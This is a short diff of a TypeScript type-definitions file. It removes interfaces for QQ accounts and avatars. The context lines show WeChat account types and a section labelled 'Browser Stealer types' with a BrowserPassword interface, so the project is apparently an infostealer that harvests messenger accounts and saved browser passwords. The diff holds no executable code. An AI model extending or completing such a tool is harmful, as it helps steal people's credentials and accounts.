@@ -315,20 +315,6 @@ export interface WeChatResult {
   accounts: WeChatAccount[];
 }
 
-export interface QQAccount {
-  number: string;
-  path: string;
-}
-
-export interface QQResult {
-  accounts: QQAccount[];
-}
-
-export interface QQPortrait {
-  avatar: string;
-  nickname: string;
-}
-
 // ── Browser Stealer types ────────────────────────────────────────────
 
 export interface BrowserPassword {
